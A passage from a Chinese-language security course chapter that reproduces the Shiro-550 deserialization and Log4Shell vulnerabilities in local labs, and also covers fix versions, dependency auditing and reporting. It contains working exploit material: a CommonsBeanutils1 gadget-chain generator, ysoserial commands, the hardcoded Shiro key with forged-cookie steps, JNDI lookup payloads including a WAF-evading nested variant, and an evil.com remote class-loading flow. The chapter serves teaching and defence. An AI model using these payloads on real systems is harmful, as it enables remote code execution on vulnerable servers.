生成器把恶意类字节码塞进 `TemplatesImpl`，用 `PriorityQueue` + `BeanComparator` 把触发条件摆好，序列化落盘：

```java
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.beanutils.BeanComparator;

import java.io.FileOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.PriorityQueue;

public class GenCB1 {
    static void set(Object obj, String field, Object value) throws Exception {
        Field f = find(obj.getClass(), field);
        f.setAccessible(true);
        f.set(obj, value);
    }

    static Field find(Class<?> c, String name) throws Exception {
        while (c != null) {
            try {
                return c.getDeclaredField(name);
            } catch (NoSuchFieldException e) {
                c = c.getSuperclass();
            }
        }
        throw new NoSuchFieldException(name);
    }

    public static void main(String[] args) throws Exception {
        byte[] evil = Files.readAllBytes(Paths.get(args[0]));
        String out = args[1];

        TemplatesImpl templates = new TemplatesImpl();
        set(templates, "_bytecodes", new byte[][]{evil});
        set(templates, "_name", "Evil");
        set(templates, "_tfactory", new TransformerFactoryImpl());

        BeanComparator comparator = new BeanComparator("lowestSetBit");  // 占位属性：BigInteger 真有它
        PriorityQueue<Object> queue = new PriorityQueue<>(2, comparator);
        queue.add(new java.math.BigInteger("1"));
        queue.add(new java.math.BigInteger("1"));
        set(comparator, "property", "outputProperties");           // 换成真正的触发属性
        set(queue, "queue", new Object[]{templates, templates});

        try (ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(out))) {
            oos.writeObject(queue);
        }
        System.out.println("written " + out + ", " + Files.size(Paths.get(out)) + " bytes");
    }
}
```

> [!info]- 生成期为什么先用占位属性
> `PriorityQueue.add()` 本身就会触发比较器。若一开始就把属性设为 `outputProperties`，生成 payload 的那一刻链条就会当场点火。所以先用 `BigInteger` 真实存在的属性 `lowestSetBit` 把两个占位元素加进队列，再反射改属性、换队列内容——生成期安全，反序列化期点火。占位属性必须是对象上真实存在的 bean 属性，这是 ysoserial 同名 payload 也用 `BigInteger` 的原因。

> [!info]- 标准工具 ysoserial
> 社区标准工具一条命令生成同类 payload（fat jar 从 GitHub release 下载，`unzip -t` 验证完整性）：
>
> ```bash
> java --add-opens java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED \
>      --add-opens java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED \
>      --add-opens java.base/java.lang=ALL-UNNAMED \
>      --add-opens java.base/java.util=ALL-UNNAMED \
>      -jar ysoserial-all.jar CommonsBeanutils1 'touch /tmp/w18_shiro_hit' > cb1.ser
> ```
>
> 两个使用提示。一是 JDK 16 起的模块封装要求显式 `--add-opens` 才能对 `xsltc.trax`、`xsltc.runtime` 这些内部包做反射，生成与打靶两侧都要加，缺哪个包就在报错里补哪个；老 JDK 8 的目标环境不需要这些参数。二是 ysoserial 的 TemplatesImpl 系 payload 对 JDK 版本敏感：同一份产物在某些新 JDK 上会停在"反序列化抛异常、命令未执行"，遇到这种局面换本节的手写链逐层核对，或改试其他 gadget（常见问题表有对应条目）。

编译与生成。`--add-opens` 参数在生成与打靶两侧反复出现，存成变量（`javac` 还需要 `--add-exports` 读 JDK 内部包的声明）：

```bash
OPENS="--add-opens java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED \
       --add-opens java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED \
       --add-opens java.base/java.lang=ALL-UNNAMED \
       --add-opens java.base/java.util=ALL-UNNAMED"

javac --add-exports java.xml/com.sun.org.apache.xalan.internal.xsltc=ALL-UNNAMED \
      --add-exports java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED \
      --add-exports java.xml/com.sun.org.apache.xml.internal.dtm=ALL-UNNAMED \
      --add-exports java.xml/com.sun.org.apache.xml.internal.serializer=ALL-UNNAMED \
      --add-exports java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED \
      EvilTranslet.java
javac --add-exports java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED \
      -cp $CP GenCB1.java
java $OPENS -cp $CP:. GenCB1 EvilTranslet.class evil_cb1.ser
```

输出：

```
written evil_cb1.ser, 1671 bytes
```

伪造 cookie、打靶：

```bash
rm -f /tmp/w18_shiro_hit
COOKIE3=$(python3 forge_rememberme.py evil_cb1.ser)
java $OPENS -cp $CP:. ShiroVictim "$COOKIE3"
echo '--- marker file ---'
ls -la /tmp/w18_shiro_hit && cat /tmp/w18_shiro_hit
```

输出：

```
[victim] hardcoded default key = kPH+bIxk5D2deZiIxcaaaA==
[victim] received rememberMe cookie, 1696 bytes after base64 decode
[victim] decrypted 1671 bytes, magic = aced0005
[victim] exception after readObject: java.lang.RuntimeException: InvocationTargetException: java.lang.reflect.InvocationTargetException
[victim] request finished
--- marker file ---
-rw-r--r-- 1 hua hua 115 Oct 24 00:36 /tmp/w18_shiro_hit
uid=1000(hua) gid=1000(hua) groups=1000(hua),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),100(users),1001(docker)
```

读这段输出：解密成功（魔数 `aced0005`），`readObject` 抛了异常，==但标记文件已经生成、里面是 `id` 的输出==——==命令在异常之前执行==。时序是链条本来的样子：堆整理触发 `compare` → `getOutputProperties` → 字节码被加载、静态块执行 `Runtime.exec` → 第二次比较在已被消费的对象上失败、异常抛出。真实应用同样会在执行之后才报错——==以"副作用"而不是"回显"判断链条是否点火，是 Java 反序列化利用的常规判定方式==。

### 3.6 版本对照与当代表现

| 版本 | rememberMe 加密 | 攻击面 |
| ---- | ---- | ---- |
| 1.2.4 及更早 | 硬编码 key `kPH+bIxk5D2deZiIxcaaaA==`，AES-CBC | ==密钥公开，开箱即打==（CVE-2016-4437，1.2.5 修复） |
| 1.2.5 – 1.4.1 | 每次启动随机生成 key（1.2.5 源码同文件：`setCipherKey(cipherService.generateNewKey().getEncoded())`） | 默认安全；==运维自行配置固定 key 的部署仍回到 1.2.4 的处境==，这也是该编号至今仍在产出案例的原因 |
| 1.4.2 起 | 默认加密模式换成 AES-GCM（`AesCipherService` 文档注明"将父类的默认 CBC 模式改为 GCM"） | 旧格式伪造的 cookie 直接解密失败，需要按目标版本重新构造 |

> [!info]- 较新 JDK 上 shiro 1.2.4 序列化器的坑
> 本节靶子的第②步用标准 `ObjectInputStream` 而非 shiro 自带的 `ClassResolvingObjectInputStream`，原因：shiro 1.2.4 的类解析走 `ClassLoader.loadClass()`，而这个入口==解析不了数组类名==（`[[B` 这类描述符只有 `Class.forName` 能处理），反序列化 `TemplatesImpl`（携带 `byte[][]` 字段）时流解析中断，报 `StreamCorruptedException: invalid type code: CA`。对 payload 做同样的解密后用标准 `ObjectInputStream` 读取，链条照常点火——解密与反序列化两段是独立的，前半段的 shiro 代码路径不受影响。JDK 8 的真实漏洞环境上不存在这个分叉，整条链在 shiro 自己的序列化器内走完；在较新 JDK 上做实验时，把两段拆开是等价做法。

## 4. Log4j2 JNDI 注入（CVE-2021-44228）

### 4.1 漏洞机理：日志消息被 lookup 二次解析

Log4j2 的输出格式串支持 `${prefix:name}` 形式的 lookup：`${java:runtime}` 展开成运行时版本，`${env:USER}` 展开成环境变量。2021 年 12 月曝光的 Log4Shell 的根子是：==对**日志消息内容本身**也做了这套 lookup 解析==。任何日志语句 `logger.error(msg)` 里的 `${...}` 都会被再次求值，包括 `${jndi:ldap://host/path}`——它让日志库主动向指定地址发起一次 JNDI/LDAP 请求。

```
攻击者输入  ${jndi:ldap://evil.com/x}
    ↓ 进入日志语句
MessagePatternConverter 渲染 %msg 时解析 ${...}
    ↓ 识别 jndi: 前缀
JndiLookup.lookup("ldap://evil.com/x")
    ↓ 发起 LDAP 连接
连上攻击者的 LDAP 服务 → 服务端返回"类在 http://evil.com/ 处" → JVM 下载并加载该类 → RCE
```

最后一跳"从远端下载类"有 JDK 版本前提：`com.sun.jndi.ldap.object.trustURLCodebase` 在 ==JDK 6u141 / 7u131 / 8u121 起默认关闭==，高版本 JDK 上 JNDI 不再直接加载远端 codebase 的类。所以完整的 RCE 需要旧 JDK 配旧组件；高版本 JDK 上漏洞仍然触发（lookup 照常发生、连接照常发起），只是链条止步于"发起请求"——==这层"能到哪一步"本身就是版本判断题，也是复现时要如实报告的内容==。

### 4.2 复现：lookup 触发的取证

靶子一个类，把命令行参数当用户输入写进日志（log4j-core 2.14.1 直连 Maven Central 下载，无需配置文件，默认控制台输出的 pattern 含 `%msg`）：

```java
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

public class Log4jVictim {
    private static final Logger log = LogManager.getLogger(Log4jVictim.class);

    public static void main(String[] args) {
        String input = args[0];
        System.out.println("[victim] logging user input: " + input);
        log.error("user input: {}", input);
        System.out.println("[victim] log call returned");
    }
}
```

"攻击者的恶意服务"用一个只负责接受连接、打印收到的字节的 Python 假 LDAP 服务——==目标不是完成 RCE，是取证"lookup 被触发"==：

```python
# fake_ldap.py —— 假 LDAP 服务：只接受连接并打印收到的字节，用于证明 JNDI lookup 已触发
import socket
import sys

port = int(sys.argv[1])
wait = int(sys.argv[2]) if len(sys.argv) > 2 else 8

srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
srv.bind(('127.0.0.1', port))
srv.listen(1)
srv.settimeout(wait)
print(f'listening on 127.0.0.1:{port} (timeout {wait}s)', flush=True)

try:
    conn, addr = srv.accept()
    conn.settimeout(3)
    print(f'connection from {addr}', flush=True)
    data = conn.recv(4096)
    print(f'received {len(data)} bytes:', flush=True)
    print(repr(data), flush=True)
    conn.close()
except socket.timeout:
    print('no connection within timeout', flush=True)
```

**明文 payload 打 2.14.1**（假 LDAP 监听 9812）：

```bash
python3 fake_ldap.py 9812 10 &
sleep 1
java -cp .:log4j-api-2.14.1.jar:log4j-core-2.14.1.jar Log4jVictim \
  '${jndi:ldap://127.0.0.1:9812/w18poc}'
```

监听端输出：

```
listening on 127.0.0.1:9812 (timeout 10s)
connection from ('127.0.0.1', 46294)
received 14 bytes:
b'0\x0c\x02\x01\x01`\x07\x02\x01\x03\x04\x00\x80\x00'
```

靶机输出：

```
[victim] logging user input: ${jndi:ldap://127.0.0.1:9812/w18poc}
00:28:50.999 [main] ERROR Log4jVictim - user input: ${jndi:ldap://127.0.0.1:9812/w18poc}
[victim] log call returned
```

两侧对照读：假 LDAP 收到的 14 字节是标准的 LDAP 匿名绑定请求（`0x30` 序列 + `0x60` bindRequest + 协议版本 3）——==日志语句真的发起了 LDAP 连接==。日志行里 payload 原样出现，是因为假服务随即断开、lookup 失败返回空，消息保持字面——==连接行为本身就是漏洞成立的证据，不依赖回显==。

**嵌套混淆变形**：lookup 解析是递归的，`${lower:j}` 求值为 `j` 再拼回外层——WAF 对明文 `jndi` 的匹配被这样绕开：

```bash
python3 fake_ldap.py 9813 10 &
sleep 1
java -cp .:log4j-api-2.14.1.jar:log4j-core-2.14.1.jar Log4jVictim \
  '${${lower:j}ndi:${lower:l}dap://127.0.0.1:9813/n3sted}'
```

输出（监听端）：

```
listening on 127.0.0.1:9813 (timeout 10s)
connection from ('127.0.0.1', 46596)
received 14 bytes:
b'0\x0c\x02\x01\x01`\x07\x02\x01\x03\x04\x00\x80\x00'
```

变形后的字符串同样触发了连接——==变形攻击的是"检测规则"，不是漏洞机理==，机理层的修复（见 4.3）对一切变形免疫。

**无害 lookup 的对照**：同一套解析器对普通 lookup 的行为——值被真实替换：

```bash
java -cp .:log4j-api-2.14.1.jar:log4j-core-2.14.1.jar Log4jVictim \
  'java:runtime = ${java:runtime}, env USER = ${env:USER}'
```

输出：

```
[victim] logging user input: java:runtime = ${java:runtime}, env USER = ${env:USER}
00:28:57.113 [main] ERROR Log4jVictim - user input: java:runtime = OpenJDK Runtime Environment (build 21.0.12.1+1-1-26.04.4-Ubuntu) from Ubuntu, env USER = hua
[victim] log call returned
```

`${java:runtime}`、`${env:USER}` 都展开了——==lookup 机制本身是正常功能，漏洞在于它作用于不可信的消息内容==。

### 4.3 修复序列与检测

| 版本 | 处理的编号 | 修复方式 |
| ---- | ---- | ---- |
| 2.15.0 | CVE-2021-44228 | JNDI lookup 默认只允许 localhost 协议、限制访问，==修复不完整== |
| 2.16.0 | CVE-2021-45046 | 消息 lookup 默认禁用，仅配置文件中可用 |
| 2.17.0 | CVE-2021-45105 | 递归求值导致的栈溢出 |
| 2.17.1 | CVE-2021-44832 | 配置中的 JNDI 也收紧 |

同一发 payload 打 2.17.1 验证修复（监听 9814，等满超时）：

```bash
python3 fake_ldap.py 9814 8 &
sleep 1
java -cp .:log4j-api-2.17.1.jar:log4j-core-2.17.1.jar Log4jVictim \
  '${jndi:ldap://127.0.0.1:9814/w18poc}'
```

监听端输出：

```
listening on 127.0.0.1:9814 (timeout 8s)
no connection within timeout
```

靶机输出：

```
[victim] logging user input: ${jndi:ldap://127.0.0.1:9814/w18poc}
00:28:58.724 [main] ERROR Log4jVictim - user input: ${jndi:ldap://127.0.0.1:9814/w18poc}
[victim] log call returned
```

payload 字面输出、监听端==零连接==——lookup 被彻底停用。检测侧的教训与此对称：2.15.0"修复后"的版本仍有绕过，==判断是否可打必须回到具体版本号==，而不是"打过补丁"。无回显场景的批量检测与 4.2 同构：指向自己控制的 DNS/HTTP 服务，看有没有回连。

> [!info]- 高版本 JDK 上能不能打穿 RCE
> 4.1 的限制（8u121+ 关闭 `trustURLCodebase`）把"从远端下载类"这条路封了，但 JNDI 注入的研究没有停：利用目标应用 classpath 里已有的工厂类（如 Tomcat 的 `BeanFactory` + EL 表达式）构造本地利用链可以在部分组件组合下继续 RCE。这些变体依赖目标组件清单，没有通用 payload——复现报告里写清"lookup 已触发、RCE 因 JDK 版本未达成"比硬凑一个不可复现的利用链更有价值。要完整复现原始 RCE，用漏洞镜像环境（[[13-Docker与赛题环境|13 章]]）提供旧 JDK 与旧组件。

## 5. 防御与运营视角

**组件清单（SBOM）**。三个漏洞的应急动作第一步都一样：回答"我的系统里有没有这个组件、什么版本"。软件物料清单（SBOM）把这件事从"出事后翻仓库"变成"出事前就有表"：构建时导出依赖树（`composer.lock`、`mvn dependency:tree`、`pip freeze`），留存版本与来源。没有清单时，2.3 的 `composer audit` 就是现成的体检工具——对一个钉在 5.0.22 的项目跑它：

```bash
composer audit
```

输出（节选，共 13 条）：

```
Found 13 security vulnerability advisories affecting 1 package:
+-------------------+----------------------------------------------------------------------------------+
| Package           | topthink/framework                                                               |
| Severity          | critical                                                                         |
| Advisory ID       | PKSA-xv6g-qybq-hr8n                                                              |
| CVE               | CVE-2022-47945                                                                   |
| Title             | ThinkPHP Framework vulnerable to remote code execution                           |
| Affected versions | <6.0.14                                                                          |
+-------------------+----------------------------------------------------------------------------------+
```

==已知漏洞的编号、影响区间、严重程度，全部来自与 1.2 节同一套 Advisory 数据==——依赖告警、2.3 的安装拦截、漏洞库检索是同一份数据的三个出口。

**WAF 的局限**。2.2 的补丁一行正则解决问题，而 WAF 只能匹配已知形态：4.2 的 `${${lower:j}ndi:...}` 变形专门对付字符串匹配，PHP 侧 payload 的编码变体同理。==WAF 是纵深的一层，不是修复的替代==——升级组件才是，优先级也按这条排。

**复现报告**。漏洞复现的产出物是一份可复核的报告，固定五段：目标组件与精确版本；漏洞编号与影响区间；复现环境（来源与版本，1.3 的表）；复现步骤（每条命令配输出，==输出块就是证据==）；结果与边界（打到了哪一步、哪一步因版本未达成，4.1 的"能到哪一步"如实写）。第 6 节的常见问题表大部分条目就是这类报告的"环境与版本"一栏里值得记录的内容。

> [!note] 组件漏洞的家族还在扩大
> 本章三个洞分布在 PHP 框架、Java 安全框架、Java 日志库；Node.js 生态的原型污染是同一家族的另一支——"依赖的代码在解释攻击者的输入"，见 [[W14-原型污染与Node.js|W14]]。==学会一套复现方法，比记住三个 payload 重要==：指纹 → 版本 → 检索 → 环境 → 打靶 → 报告，这个流程对下一个组件漏洞原样适用。

## 6. 常见问题

| 现象 | 原因与解决 |
| ---- | ---- |
| `composer create-project` 被安全通告拦截 | 依赖管理器默认拒绝装带 Advisory 的版本：按提示加 `--no-security-blocking`，或逐条加 ignore（第 5 节的防御视角）；也可绕开 composer 直接从 GitHub tag 下载源码（[[#1.3 复现环境怎么来\|1.3]]） |
| 骨架装的是最新修复版，不是想要的漏洞版本 | 骨架约束是 `5.0.*` 时会解析到区间内最新版：改 `composer.json` 约束为精确版本后单独 `composer update 包名`（[[#2.3 真实框架复现\|2.3]]） |
| 旧框架在新 PHP 上默认页直接 500 | 弃用告警被框架错误处理器抛成异常、默认配置里的过时值（时区 `PRC`）已移除：报告级别排除 `E_DEPRECATED`、替换过时配置（[[#2.3 真实框架复现\|2.3]]） |
| curl 打 payload 报 malformed URL | URL 里的裸反斜杠、空格、方括号不被接受：换 `-G --data-urlencode` 让 curl 编码（[[#2.2 行为等价最小靶\|2.2]]） |
| payload 读文件报 No such file or directory | `php -S` 的工作目录是 `-t` 的 docroot：相对路径从 docroot 起算，`application/` 在上一级就写 `../application/`（[[#2.3 真实框架复现\|2.3]]） |
| shiro 靶启动报 `NoClassDefFoundError: org/slf4j/LoggerFactory` | shiro-core 的日志门面缺依赖：classpath 补 `slf4j-api`（加 `slf4j-nop` 可静默）（[[#3.3 最小靶：驱动真实 shiro-core 的解密路径\|3.3]]） |
| ysoserial 生成报 `IllegalAccessError ... xsltc.runtime` | 模块封装拦截反射：`--add-opens` 要覆盖 `xsltc.trax` 与 `xsltc.runtime` 两个包，生成与打靶两侧都加（[[#3.5 gadget 链：从 readObject 到命令执行\|3.5]] 折叠框） |
| `java -jar ysoserial` 报 Invalid or corrupt jarfile | GitHub 大文件下载不完整：`unzip -t` 验证，失败重下（[[#3.5 gadget 链：从 readObject 到命令执行\|3.5]]） |
| CB1 靶上报 `invalid type code: CA` | shiro 1.2.4 的类解析器用 `ClassLoader.loadClass`，解析不了数组类名 `[[B`：解密与反序列化两段拆开，后半段用标准 `ObjectInputStream`（[[#3.6 版本对照与当代表现\|3.6]] 折叠框） |
| GenCB1 生成期就抛 `NoSuchMethodException: Unknown property` | `PriorityQueue.add()` 会立即用比较器比较占位元素：占位属性必须真实存在（`BigInteger` 的 `lowestSetBit`），点火属性在 add 之后再反射换入（[[#3.5 gadget 链：从 readObject 到命令执行\|3.5]] 折叠框） |
| javac 编译 translet 报 cannot find symbol | 新 JDK 的 `AbstractTranslet` 抽象方法签名与老资料不同：按当前 JDK 的签名实现两个 `transform`，编译加 `--add-exports`（[[#3.5 gadget 链：从 readObject 到命令执行\|3.5]]） |
| ysoserial 生成成功、靶上只抛异常不执行 | TemplatesImpl 系 gadget 对 JDK 版本敏感，内部依赖在新 JDK 上断链：换手写链逐层核对，或改用其他 gadget（[[#3.5 gadget 链：从 readObject 到命令执行\|3.5]]） |
| 日志行里 payload 原样出现，算不算打中 | 看==外联证据==：本地监听/DNS 日志收到连接即 lookup 已触发，字面输出只是回显缺失（[[#4.2 复现：lookup 触发的取证\|4.2]]） |
| 想复现完整 RCE，lookup 之后断了 | 高版本 JDK 封了 JNDI 远程类加载（8u121+）：完整 RCE 需要旧 JDK + 旧组件，用漏洞镜像环境补齐（[[#4.1 漏洞机理：日志消息被 lookup 二次解析\|4.1]]） |
| 修复后怎么确认生效 | 同一 payload 打修复版本 + 监听端等满超时：字面输出且零连接才算修住（[[#4.3 修复序列与检测\|4.3]]） |

## 7. 配套练习与延伸阅读

> [!note] 实战任务
> **vulhub 环境复现**（镜像与 compose 文件见其 GitHub 仓库 `vulhub/vulhub`，用法遵循 [[13-Docker与赛题环境|13 章]]）：挑本章三题对应的目录——`thinkphp/5-rce`、`shiro/CVE-2016-4437`、`log4j2/CVE-2021-44228`——每题按第 1 节的流程走一遍：先只看 compose 文件与 README 指出组件与版本，检索编号核对影响区间，再起靶打 payload，最后把与本章输出的差异记下来（JDK 版本、payload 差异都是预期内的变量）。

配套练习：

1. 下载 ThinkPHP `v5.1.30` 与 `v5.1.31` 的框架源码（GitHub tag），diff 出控制器名正则的落点（`route/dispatch/Url.php`）；对照 [[#2.4 版本差异与时间线|2.4]] 的表，说明为什么同一个修复在 5.0 与 5.1 里位置不同。
2. 把 `brute_key.py` 的字典换成更多公开 Shiro key，对同一 cookie 跑一遍，统计"ACED 魔数命中"与"padding 合法"两个条件的过滤顺序哪个先生效更省时间。
3. 给 `GenCB1` 换一个终点命令（写文件而不是执行命令），重新生成 payload 打靶，体会 3.5 末尾"以副作用判定点火"的判定方式；再把 `EvilTranslet` 的静态块改成构造函数执行，对比两种时机在靶上的可见差异。
4. 给 `fake_ldap.py` 加上多连接接受能力（循环 `accept`），在一个监听端上同时收 4.2 的多个变体连接，按收到的端口与字节确认每个变形都各自发起了请求。
5. 对 2.3 的项目完整跑一遍 `composer audit`（不截断输出），把每条告警的 CVE 与影响区间抄下来，与 1.2 节检索到的编号对照；挑其中一条在 GitHub Advisory 页核对"受影响版本"的写法，把来源与结论写进复现报告的环境一栏。

延伸阅读：

- NVD 的三条编号页：CVE-2018-20062（ThinkPHP 路由调用族）、CVE-2016-4437（Shiro-550）、CVE-2021-44228（Log4Shell）——影响区间的权威出处；
- Apache Logging Services 安全页（logging.apache.org/security.html）：Log4j2 四个连号编号的官方公告与修复版本表，[[#4.3 修复序列与检测|4.3]] 表格的原始出处；
- ysoserial 仓库（GitHub `frohoff/ysoserial`）：Java gadget 链的百科，CB1 之外还有 CommonCollections 系、Jdk7u21 等，链结构与 [[#3.5 gadget 链：从 readObject 到命令执行|3.5]] 的五跳表对照阅读；
- marshalsec 仓库（GitHub `mbechler/marshalsec`）：JNDI 利用侧的 LDAP/RMI 服务端工具，[[#4.1 漏洞机理：日志消息被 lookup 二次解析|4.1]] 里"恶意 LDAP 返回类地址"那一步的工业实现；
- composer 官方文档的 security-advisories 章节：`audit` 与安装拦截的策略配置，第 5 节输出的机制说明；
- 回看对照：[[W12-PHP反序列化|W12]] 的 POP 链三步法是 3.5 节链构造的 PHP 侧镜像，[[W09-SSTI|W09]] 的引擎识别与本章 1.1 的指纹识别共用同一套"特征 → 组件"思路。
